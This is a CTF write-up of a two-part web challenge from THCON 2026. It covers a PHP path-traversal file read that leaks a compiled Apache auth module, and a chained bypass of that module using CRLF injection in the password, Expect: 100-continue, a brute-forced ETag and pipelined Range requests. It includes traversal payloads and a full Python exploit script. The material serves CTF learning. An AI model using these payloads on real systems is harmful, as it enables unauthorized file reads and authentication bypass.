---
title: (English) THCON 2026 CTF — THCity Authentication Collapse — Write-up
date: 2026-5-10 14:19:33
top_img: /img/thcon/thcon.png
cover: /img/thcon/thcon.png
categories:
  - Web Exploit
  - Writeup CTF
toc: true
---
>In this CTF tournament, I successfully clear all web challenge with team Void_Walker

![image](https://cdn.h26v.io.vn/1778421317011-b29e000166fce1f1.png)
This is my write up for chall THCity: Authentication Collapse (Part 1 and 2)
---

## Overview

The challenge runs two Docker services behind a single Apache HTTP server on port 8888:

- **flag_app** (PHP + Apache): serves a public site and a Basic-Auth-protected `/secret/` page whose PHP reads a flag from Redis.
- **express_sso** (Node.js/Express): an internal SSO service on port 3000, only reachable from flag_app.

Apache's auth on `/secret/` is handled by a custom compiled module `mod_auth_thcity.so` that proxies Basic-Auth credentials to the Express SSO. The module source provided in the repo is a simplified stub; the real compiled binary is significantly more complex.

---

## Flag 1 — LFI via `image.php` PHP Operator-Precedence Bug

### Vulnerability

`/var/www/html/image.php`:

```php
<?php
$img = "./images/" . $_GET["img"] ?? "";
if(is_file($img)){
    $mime = mime_content_type($img);
    if($mime){ header("Content-Type: $mime"); }
    readfile($img);
}
```

PHP's concatenation operator `.` has higher precedence than `??`. The expression therefore parses as:

```php
$img = ("./images/" . $_GET["img"]) ?? "";
```

The null-coalescing fallback (`?? ""`) never triggers because the string concatenation always produces a non-null result, even if `$_GET["img"]` is absent. `$img` always equals `"./images/"` + whatever the user passes — a classic LFI-arbitrary file read.

Payload to read file is:
```
GET /image.php?img=../../../../etc/passwd
```


### Exploitation

The compiled Apache module is at `/usr/lib/apache2/modules/mod_auth_thcity.so`. Reading it via path traversal:

```
GET /image.php?img=../../../../usr/lib/apache2/modules/mod_auth_thcity.so
```

The binary is returned as raw bytes. The challenge description says the flag is compiled into the `.so` at build time (the Dockerfile runs `sed -i "s/#FLAG#/${FLAG}/g" mod_auth_thcity.c` before `apxs -i -a -c`), so the flag1 string lives in the binary

```
2280  5448437b 4c33346b 5f417034 6368335f  THC{L34k_Ap4ch3_
2290  6d306475 6c335f66 52306d5f 46316c33  m0dul3_fR0m_F1l3
22a0  5f723340 647d0000 00000000 00000000  _r3@d}..........
```
just read it:
```
strings mod_auth_thcity.so | grep THC
THC{L34k_Ap4ch3_m0dul3_fR0m_F1l3_r3@d}
```
---

## Flag 2 — Multi-Step Bypass of `mod_auth_thcity`

This flag requires chaining four distinct primitives. We need reverse engineering the compiled module (claude cook that for me- nevermind)

### Step 0 — Reverse Engineering the Real Module

The binary obtained via the LFI was analysed with `objdump -d`. The stub source checks:

```c
if (strstr(buf, "AuthOK") != NULL) { granted = 1; }
```

The real binary implements a much stricter pipeline inside `thcity_sso_check_password`:

1. **HTTP status gate** (`0x17f8`): `sscanf(buf, "HTTP/%*d.%*d %u", &status)` — if status > 201, return AUTH_GENERAL_ERROR (HTTP 500).
2. **Body separator** (`0x1803`): `strstr(buf, "\r\n\r\n")` — scan starts 4 bytes after the first blank line.
3. **Line scan loop** (`0x184b`–`0x1867`): for each line from `ap_getword(pool, &ptr, '\n')`:
   - if `strstr(line, "AuthNOK")` → AUTH_GENERAL_ERROR (deny)
   - if `strstr(line, "AuthOK")` → enter extraction phase
4. **Username extraction** (`0x1d13`–`0x1d5f`): after finding "AuthOK", scan subsequent lines for the 10-byte literal `"username"` (with real double-quote bytes). When found, extract the value between the next two `"` characters via two `strchr` calls. Store result in `r->user`. Return AUTH_GRANTED.

The Express SSO (`index.js`) always returns 403 with:
```json
{"status":"AuthNOK","error":"Invalid credentials for user: <username>"}
```
Status 403 > 201 fails the gate immediately. Standard approaches ("AuthOK" as username, etc.) fail at one or more of these checks.

### Step 1 — Status Gate Bypass via `Expect: 100-continue`

The module builds its HTTP request using `snprintf` with no URL encoding on the credentials:

```
GET /sso/text?username=%s&password=%s HTTP/1.1\r\n
Host: %s\r\n
User-Agent: mod_auth_thcity/1.0\r\n
Connection: close\r\n
\r\n
```

The `password` value goes directly into the HTTP request line. Injecting a CRLF terminates the request line early and appends arbitrary headers:

```
password = "x HTTP/1.1\r\nHost: express_sso\r\nExpect: 100-continue\r\nFoo: x\r\n\r\n..."
```

After snprintf substitution, request 1 becomes:

```http
GET /sso/text?username=...&password=x HTTP/1.1
Host: express_sso
Expect: 100-continue
Foo: x

```

Node.js (HTTP/1.1) honours `Expect: 100-continue` for any request. Before sending the 403 response it sends:

```
HTTP/1.1 100 Continue\r\n\r\n
```

The module's `get_http_status_code` reads the first HTTP status in the buffer. It sees `HTTP/1.1 100` → status = 100 ≤ 201 → **gate passes**.

The body scan then begins at byte 26 (after the 100-continue response's `\r\n\r\n`), landing inside the 403 *response headers* — before the JSON body.

### Step 2 — "AuthOK" Without "AuthNOK" via ETag Collision

The body scan processes each line of the 403 response headers. The order is:

```
HTTP/1.1 403 Forbidden
X-Powered-By: Express
Content-Type: application/json; charset=utf-8
Content-Length: 71
ETag: W/"47-jmzfzxKychbV4eceMIAuthOK1Nk"   ← line 5
Date: ...
Connection: keep-alive
                                              ← blank line
{"status":"AuthNOK","error":"..."}           ← JSON body (line 9)
```

Express uses the `etag` package (v1.8.1) to compute `ETag`:

```javascript
function entitytag(entity) {
    var hash = crypto.createHash('sha1')
                     .update(entity, 'utf8')
                     .digest('base64')
                     .substring(0, 27);
    var len = Buffer.byteLength(entity, 'utf8');
    return '"' + len.toString(16) + '-' + hash + '"';
}
```

The ETag for the 403 response body `{"status":"AuthNOK","error":"Invalid credentials for user: X"}` is therefore:

```
W/"<hex_len>-<SHA1(body)[:27 base64 chars]>"
```

If the first 27 base64 characters of SHA-1(body) contain the substring `AuthOK` (valid base64 chars: A, u, t, h, O, K) but **not** `AuthNOK`, the ETag line will trigger the "AuthOK" check at line 5 **before** the scan ever reaches the JSON body with `AuthNOK` at line 9.

#### Brute-force

Since SHA-1 output is effectively random, we iterate candidate usernames until we find one meeting the condition. The probability is approximately:

```
P = 22 × (1/64)^6 ≈ 3.2 × 10⁻¹⁰   (22 positions × 6-char substring in 64-char alphabet)
Expected trials ≈ 3.1 × 10⁹
```

A multi-threaded C program using OpenSSL SHA-1 finds the answer in ~3–4 minutes on 4 cores:

```c
// Body format: {"status":"AuthNOK","error":"Invalid credentials for user: X"}
// Prefix = first 59 bytes (fixed), then username, then "}
char body[256];
memcpy(body, PREFIX, 59);
// ... fast integer-to-decimal conversion ...
SHA1((unsigned char*)body, body_len, md);
// base64-encode 20 SHA-1 bytes to get 27 chars
if (strstr(b64out, "AuthOK") && !strstr(b64out, "AuthNOK")) { FOUND }
```

**Result:** username `3020920468` → ETag hash `jmzfzxKychbV4eceMIAuthOK1Nk`

Full ETag header line: `ETag: W/"47-jmzfzxKychbV4eceMIAuthOK1Nk"`
`strstr(line, "AuthOK")` matches at position 25.
`strstr(line, "AuthNOK")` does not match.

The module finds "AuthOK" in the ETag line and **enters extraction phase** (looking for `"username"`). All subsequent "AuthNOK" occurrences in the JSON body are now irrelevant — the module is no longer checking for them.

### Step 3 — Injecting `"username"` via HTTP Pipelining + Range Request

After entering the extraction phase the module calls `ap_getword(pool, &ptr, '\n')` repeatedly on the remaining buffer, searching for the 10-byte literal `"username"` (with real double-quote bytes, i.e. `0x22 0x75 0x73 0x65 0x72 0x6e 0x61 0x6d 0x65 0x22`). The 403 JSON body does not contain this pattern (JSON.stringify escapes `"` → `\"` in values).

The solution is to pipeline a second HTTP request from within the injected password. Continuing the CRLF injection:

```
password = x HTTP/1.1\r\n
           Host: express_sso\r\n
           Expect: 100-continue\r\n
           Foo: x\r\n
           \r\n
           GET / HTTP/1.1\r\n
           Range: bytes=2171-2225\r\n
           Bar:
```

After snprintf substitution the wire bytes sent to Express become two pipelined HTTP/1.1 requests:

**Request 1:**
```http
GET /sso/text?username=3020920468&password=x HTTP/1.1
Host: express_sso
Expect: 100-continue
Foo: x

```
→ `HTTP/1.1 100 Continue\r\n\r\n` then `HTTP/1.1 403 Forbidden ...` (with AuthOK ETag)

**Request 2** (pipelined, processed on the same kept-alive connection):
```http
GET / HTTP/1.1
Range: bytes=2171-2225
Bar: HTTP/1.1
Host: express_sso
User-Agent: mod_auth_thcity/1.0
Connection: close

```
→ `HTTP/1.1 206 Partial Content` with body = bytes 2171–2225 of `public/index.html`

The Express static middleware (`express.static`) handles Range requests and returns exactly 55 bytes:

```
            Provide a valid "username" and "password".
```

This fragment, at offset 2199 within the file, contains the literal byte sequence `"username"` (with real double-quote bytes). The module's `strstr(line, "\"username\"")` hits it.

#### Buffer size sanity check

The module's response buffer is 2048 bytes (`apr_palloc(pool, 0x800)`). Total received:

| Chunk | Size |
|---|---|
| `HTTP/1.1 100 Continue\r\n\r\n` | 26 bytes |
| 403 response headers + body | ~270 bytes |
| 206 response headers + body | ~362 bytes |
| **Total** | **~658 bytes** ✓ |

Well within the 2047-byte limit.

### Step 4 — Username Extraction and AUTH_GRANTED

Once `"username"` is found in the 206 body line, the extraction code at `0x1d13`:

1. Computes pointer = address of `"username"` + 10 (past the closing `"`)
2. `strchr(ptr, '"')` → finds `"` before the word `password` (in `"username" and "password"`)
3. `strchr(ptr+2, '"')` → finds the closing `"` after `password`
4. `apr_pstrndup(pool, open_quote+1, length)` → allocates the string `password`
5. `r->user = "password"` → sets the Apache authenticated username

`check_password` returns AUTH_GRANTED (1). Apache's `Require valid-user` directive is satisfied (any authenticated user is allowed). Apache serves `/secret/index.php`, which reads and displays `ctf_flag` from Redis.

---

## Full Attack Summary

```
Client ──HTTP Basic Auth──► Apache /secret/
  username: "3020920468"
  password: "x HTTP/1.1\r\nHost: express_sso\r\nExpect: 100-continue\r\n
             Foo: x\r\n\r\nGET / HTTP/1.1\r\nRange: bytes=2171-2225\r\nBar:"

Apache ──mod_auth_thcity──► Express SSO (TCP socket, pipelined)
  Request 1: GET /sso/text?username=3020920468&password=x HTTP/1.1
             Host: express_sso; Expect: 100-continue; ...

  Express sends:
    HTTP/1.1 100 Continue\r\n\r\n           ← status=100, gate passes
    HTTP/1.1 403 Forbidden\r\n
    ...
    ETag: W/"47-jmzfzxKychbV4eceMIAuthOK1Nk"  ← "AuthOK" found → extraction mode
    ...
    {"status":"AuthNOK","error":"..."}      ← irrelevant, already in extraction mode

  Request 2 (pipelined): GET / HTTP/1.1
             Range: bytes=2171-2225; ...

  Express sends:
    HTTP/1.1 206 Partial Content\r\n
    Content-Range: bytes 2171-2225/2572\r\n
    ...
            Provide a valid "username" and "password".\n  ← "username" found!
                                                          ← extract "password" → r->user
                                                          ← AUTH_GRANTED

Apache ──HTTP 200──► Client
  /secret/index.php renders Redis ctf_flag → FLAG2
```

---

## Exploit Script

```python
#!/usr/bin/env python3
import re, sys, requests

TARGET = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://localhost:8888"
FLAG_RE = re.compile(rb"THCON\{[^}]+\}|THC\{[^}]+\}")

def get_flag1(target):
    so_path = "../../../../usr/lib/apache2/modules/mod_auth_thcity.so"
    r = requests.get(f"{target}/image.php?img={so_path}", timeout=15)
    m = FLAG_RE.search(r.content)
    return m.group(0).decode() if m else None

def get_flag2(target):
    # ETag collision: SHA-1(403 body for user "3020920468")[:27 b64] =
    #   "jmzfzxKychbV4eceMIAuthOK1Nk"  (contains "AuthOK", not "AuthNOK")
    username = "3020920468"
    inject = (
        "x HTTP/1.1\r\n"
        "Host: express_sso\r\n"
        "Expect: 100-continue\r\n"
        "Foo: x\r\n"
        "\r\n"
        "GET / HTTP/1.1\r\n"
        "Range: bytes=2171-2225\r\n"
        "Bar:"
    )
    r = requests.get(f"{target}/secret/", auth=(username, inject), timeout=15)
    if r.status_code != 200:
        return None
    m = FLAG_RE.search(r.content)
    return m.group(0).decode() if m else None

f1 = get_flag1(TARGET)
f2 = get_flag2(TARGET)
print(f"FLAG1: {f1}")
print(f"FLAG2: {f2}")
```
Flag: `THC{S5RF_W1th_h34d3Rs_0nly_4nd_p1pi3l1nInG_l@st_sT3P!}`
---

## TL-DR
| # | Primitive | Root Cause |
|---|---|---|
| 1 | LFI in `image.php` | PHP operator precedence: `.` binds tighter than `??` |
| 2 | Status gate bypass | CRLF injection into password triggers Node.js `Expect: 100-continue`, making the module read HTTP 100 as the response status |
| 3 | AuthNOK avoidance | Body scan starts inside response *headers* (after 100-continue separator), not at the JSON body; ETag header appears before the JSON body |
| 4 | ETag "AuthOK" collision | SHA-1 brute-force (~3B iterations) over candidate usernames until the 27-char base64 digest contains "AuthOK" |
| 5 | `"username"` injection | HTTP/1.1 pipelining + Range request delivers a 206 response whose partial body is a HTML line containing literal `"username"` with real double-quote bytes |
| 6 | Username extraction quirk | Module extracts value between *next two quotes after* `"username"`, yielding `password` from the HTML `"username" and "password"` fragment |